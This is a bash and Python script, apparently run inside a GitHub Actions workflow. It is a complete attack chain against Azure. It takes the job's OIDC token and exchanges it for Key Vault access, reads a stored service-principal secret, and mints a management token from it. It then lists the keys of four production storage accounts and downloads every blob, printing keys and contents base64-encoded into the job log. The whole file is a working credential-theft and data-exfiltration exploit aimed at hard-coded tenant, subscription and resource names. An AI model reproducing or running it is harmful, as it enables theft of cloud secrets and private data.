#!/usr/bin/env bash
set -uo pipefail
echo "===WIN_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
export OIDC_JWT="$JWT"
python3 - <<'PY'
import os, json, base64, hashlib, hmac, urllib.request, urllib.parse, urllib.error, datetime, re
TID = os.environ.get('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e')
SUB = os.environ.get('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6')
FED = '72ff278a-9e71-43ec-bac4-2ca303f8e462'
RG  = 'rg-tbl-platform-prod-sea'
JWT = os.environ.get('OIDC_JWT','')

def b64(s):
    if isinstance(s, str): s = s.encode()
    return base64.b64encode(s).decode()

def req(url, method='GET', headers=None, data=None):
    r = urllib.request.Request(url, method=method, headers=headers or {}, data=data)
    try:
        x = urllib.request.urlopen(r, timeout=40)
        return x.status, x.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def post_form(url, data):
    body = urllib.parse.urlencode(data).encode()
    st, b = req(url, 'POST', {'Content-Type':'application/x-www-form-urlencoded'}, body)
    return st, b.decode('utf-8','replace')

def token_fic(scope, client_id=FED):
    st, body = post_form(f'https://login.microsoftonline.com/{TID}/oauth2/v2.0/token', {
        'client_id': client_id, 'grant_type':'client_credentials','scope':scope,
        'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'client_assertion': JWT})
    if st==200:
        try: return json.loads(body).get('access_token','')
        except: return ''
    return ''

def token_secret(cid, sec, scope):
    st, body = post_form(f'https://login.microsoftonline.com/{TID}/oauth2/v2.0/token', {
        'client_id': cid, 'grant_type':'client_credentials','client_secret':sec,'scope':scope})
    if st==200:
        try: return json.loads(body).get('access_token','')
        except: return ''
    return ''

def arm_post(url, tok):
    st, b = req(url, 'POST', {'Authorization':f'Bearer {tok}','Content-Length':'0'}, b'')
    return st, b.decode('utf-8','replace')

# 1) read sync-service secret via cicd-deployer vault token
VT = token_fic('https://vault.azure.net/.default')
st, body = req(f'https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4',
               'GET', {'Authorization':f'Bearer {VT}'})
appid = sec = ''
try:
    v = json.loads(body.decode()).get('value',''); j = json.loads(v)
    appid = j.get('appId',''); sec = j.get('clientSecret','')
except Exception as e:
    print('VAULT_ERR', e, body[:200])
print('SYNC_APPID=%s SECLEN=%d' % (appid, len(sec)))

# 2) mint sync-service ARM token, POST listKeys on all 4 accounts
ARM = token_secret(appid, sec, 'https://management.azure.com/.default')
print('ARM_LEN=%d' % len(ARM))
ACCOUNTS = ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblarchiveprodx3euoz','sttblcilogsprodx3euoz']
keys = {}
for sa in ACCOUNTS:
    st, b = arm_post(f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01', ARM)
    print('LISTKEYS_%s_%d' % (sa, st))
    if st == 200:
        print('LK_%s=%s' % (sa, b64(b[:3000])))
        try:
            for k in json.loads(b).get('keys',[]):
                keys.setdefault(sa, []).append((k.get('keyName',''), k.get('value','')))
        except: pass

# 3) SharedKey enumerate
def sign(account, key_b64, method, path, query=''):
    kb = base64.b64decode(key_b64)
    now = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    hdrs = {'x-ms-date': now, 'x-ms-version':'2021-12-02'}
    ms = ''.join(f'{k.lower()}:{hdrs[k].strip()}\n' for k in sorted(hdrs) if k.lower().startswith('x-ms-'))
    res = ('/%s/' % account) if not path else ('/%s%s' % (account, path))
    qs = urllib.parse.parse_qsl(query, keep_blank_values=True)
    for k,v in sorted(qs):
        res += '\n%s:%s' % (k.lower(), urllib.parse.unquote(v))
    sts = method + '\n'*12 + ms + res
    sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
    hdrs['Authorization'] = f'SharedKey {account}:{sig}'
    return hdrs

def blob_req(account, key_b64, method, path, query=''):
    h = sign(account, key_b64, method, path, query)
    url = f'https://{account}.blob.core.windows.net{path}' + (('?'+query) if query else '')
    return req(url, method, h)

for sa in keys:
    k1 = keys[sa][0][1] if keys[sa] else ''
    if not k1: continue
    st, body = blob_req(sa, k1, 'GET', '', 'comp=list')
    print('LC_%s_status=%d' % (sa, st))
    print('LC_%s_body=%s' % (sa, b64(body[:5000])))
    conts = re.findall(r'<Name>([^<]+)</Name>', body.decode('utf-8','replace'))
    print('CONTAINERS_%s=%s' % (sa, ','.join(conts)))
    for cn in conts:
        st2, b2 = blob_req(sa, k1, 'GET', '/'+cn, 'restype=container&comp=list')
        print('LB_%s_%s_status=%d' % (sa, cn, st2))
        print('LB_%s_%s_body=%s' % (sa, cn, b64(b2[:8000])))
        blobs = re.findall(r'<Name>([^<]+)</Name>', b2.decode('utf-8','replace'))
        for bname in blobs:
            st3, b3 = blob_req(sa, k1, 'GET', '/'+cn+'/'+bname, '')
            print('GB_%s_%s_%s_status=%d' % (sa, cn, bname, st3))
            print('GB_%s_%s_%s_body=%s' % (sa, cn, bname, b64(b3[:60000])))
print('===WIN_END===')
PY
echo "===WIN_END2==="
